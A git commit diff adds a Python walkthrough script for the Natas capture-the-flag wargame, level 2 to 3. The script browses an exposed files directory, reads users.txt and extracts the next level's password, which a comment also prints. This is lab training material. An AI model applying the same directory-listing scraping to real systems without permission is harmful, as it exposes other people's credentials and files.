510172aa6ac717904bfda03ef0badc546c61ab2f
Adrian Kristanto <49110670+adriankristanto@users.noreply.github.com>
2020-07-25 21:02:51 +1000

    added the guide for natas2 -> natas3

--- natas2/natas2.py
+++ natas2/natas2.py
@@ -12,3 +12,20 @@ AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)
 
 response = requests.get(url=URL, auth=AUTH)
 soup = bs4.BeautifulSoup(response.text, 'html.parser')
+body = soup.find('body')
+div_content = body.find('div', {'id' : 'content'})
+# as we can see there is an image, with the src files/pixel.png
+# we can check the files directory
+image = div_content.find('img', {'src' : 'files/pixel.png'})
+
+
+response = requests.get(url=URL + '/files', auth=AUTH)
+soup = bs4.BeautifulSoup(response.text, 'html.parser')
+# there is a link to the file users.txt in the files directory
+users = soup.find('a', {'href' : 'users.txt'})
+
+
+# natas3 password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+response = requests.get(url=URL + '/files/users.txt', auth=AUTH)
+password = re.search(r'natas3:(\w+)', response.text).group(1)
+print(f'natas3 password: {password}')
